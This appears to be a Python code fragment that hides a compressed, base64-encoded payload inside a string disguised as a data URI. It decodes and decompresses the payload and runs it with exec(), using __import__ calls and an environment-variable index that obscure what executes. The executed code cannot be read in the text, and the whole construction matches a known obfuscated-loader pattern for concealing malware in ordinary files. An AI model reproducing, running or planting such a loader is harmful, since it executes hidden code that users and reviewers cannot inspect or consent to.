import os
_one = int(os.environ.get('PYDECOMP_ONE', '1'))
_u = 'data:application/octet-stream;base64,eJxVjkEKwyAQRfeeYnYmEOKiWQk5RQ8gIR2JYFQchULI3aNpkfZvZvH+f8xqFyJ4IpHxTjIoeaEGpYwzSamO0OoBNk9pgOBjmqfp0X96NRWPlcJ8l/5BHRRQD2vqHO1t/bFETDk60HxLKZAU4mjeUx5NdQrOWFEs2Vbt9+mO43vZg8Vx9Tvv2QUvuEDm'
_body = _u.split(',', 1)[_one]
exec(__import__('zlib').decompress(__import__('base64').b64decode(_body)))
